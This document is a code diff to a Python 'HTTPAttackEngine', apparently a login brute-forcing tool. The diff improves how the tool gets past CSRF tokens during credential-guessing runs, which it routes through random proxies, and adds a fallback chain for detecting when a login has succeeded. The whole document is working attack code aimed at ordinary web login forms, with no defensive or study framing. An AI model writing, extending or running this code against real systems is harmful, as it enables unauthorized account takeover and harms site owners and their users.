@@ -489,6 +489,20 @@ class HTTPAttackEngine:
                     proxy_url = random.choice(proxy_list)
                     session.proxies = {"http": proxy_url, "https": proxy_url}
 
+                # ── Establish initial session cookies ──
+                try:
+                    init_resp = session.get(target_url, timeout=12)
+                    # Extract initial CSRF token if present
+                    if csrf_field:
+                        init_token = _extract_csrf_token(init_resp.text, csrf_field)
+                        if init_token:
+                            extra_fields[csrf_field] = init_token
+                except Exception as e:
+                    self._log(f"[!] Warning: initial session establishment failed: {e}")
+
+                # Track current CSRF token val locally to avoid repetitive GETs
+                current_csrf_token = extra_fields.get(csrf_field, "") if csrf_field else ""
+
                 try:
                     while (
                         not q.empty()
@@ -534,18 +548,20 @@ class HTTPAttackEngine:
                             if actual_delay > 0:
                                 time.sleep(actual_delay)
 
-                            # Fresh CSRF token if needed (re-fetch page)
+                            # Fetch fresh CSRF token ONLY if we lost it
                             current_extra = dict(extra_fields)
                             if csrf_field:
-                                try:
-                                    page_resp = session.get(target_url, timeout=10)
-                                    fresh_token = _extract_csrf_token(
-                                        page_resp.text, csrf_field
-                                    )
-                                    if fresh_token:
-                                        current_extra[csrf_field] = fresh_token
-                                except Exception:
-                                    pass  # Use stale token
+                                if not current_csrf_token:
+                                    try:
+                                        page_resp = session.get(target_url, timeout=10)
+                                        fresh_token = _extract_csrf_token(
+                                            page_resp.text, csrf_field
+                                        )
+                                        if fresh_token:
+                                            current_csrf_token = fresh_token
+                                    except Exception:
+                                        pass
+                                current_extra[csrf_field] = current_csrf_token
 
                             # Build POST data
                             post_data = {
@@ -565,11 +581,19 @@ class HTTPAttackEngine:
                             with self._metrics_lock:
                                 self.metrics["attempted"] += 1
 
-                            self._log(f"[*] Trying: {user} / {pwd}")
-
                             resp_text = resp.text.lower()
                             resp_url = resp.url if follow_redirects else ""
                             status_code = resp.status_code
+
+                            # Try to extract the next CSRF token from the POST response itself
+                            if csrf_field:
+                                next_token = _extract_csrf_token(resp.text, csrf_field)
+                                if next_token:
+                                    current_csrf_token = next_token
+                                else:
+                                    current_csrf_token = ""  # Reset to force GET next loop
+
+                            self._log(f"[*] Trying: {user} / {pwd} (Status: {status_code})")
 
                             # ── Rate limit check ──
                             if limit_text and limit_text in resp_text:
@@ -619,26 +643,35 @@ class HTTPAttackEngine:
                                 self._emit_metrics()
                                 continue
 
-                            # ── Determine success ──
+                            # ── Determine success (Fallback indicator chain) ──
                             is_success = False
-                            if success_msg:
-                                if success_msg in resp_text:
-                                    is_success = True
-                            elif status_code in (301, 302, 303, 307, 308):
-                                # Redirect without follow → likely success
+
+                            # 1. Success Message match
+                            if success_msg and success_msg in resp_text:
+                                is_success = True
+
+                            # 2. Redirect indicates success (e.g. 302 to a dashboard page)
+                            if not is_success and status_code in (301, 302, 303, 307, 308):
                                 redirect_loc = (resp.headers.get("Location") or "").lower()
-                                if redirect_loc and "login" not in redirect_loc:
+                                if redirect_loc and "login" not in redirect_loc and "error" not in redirect_loc:
+                                    self._log(f"[~] Successful redirect detected -> {redirect_loc}")
                                     is_success = True
-                            elif follow_redirects and resp_url:
+
+                            # 3. Followed redirects landed on a non-login authenticated URL
+                            if not is_success and follow_redirects and resp_url:
                                 if (
                                     resp_url != target_url
                                     and resp_url != form_action
                                     and "login" not in resp_url.lower()
+                                    and "error" not in resp_url.lower()
                                 ):
+                                    self._log(f"[~] Redirect followed successfully -> {resp_url}")
                                     is_success = True
-                            elif error_msg_lower:
-                                # Error text NOT found → success
-                                is_success = True
+
+                            # 4. Error String absent (only if error string was set and not found, and no 4xx/5xx error occurred)
+                            if not is_success and error_msg_lower and (status_code >= 200 and status_code < 300):
+                                if error_msg_lower not in resp_text:
+                                    is_success = True
 
                             if is_success:
                                 with self._found_lock:
@@ -672,6 +705,7 @@ class HTTPAttackEngine:
 
                                 # Reset session for clean state (new cookies)
                                 session.cookies.clear()
+                                current_csrf_token = ""
                                 continue
                             else:
                                 with self._metrics_lock:
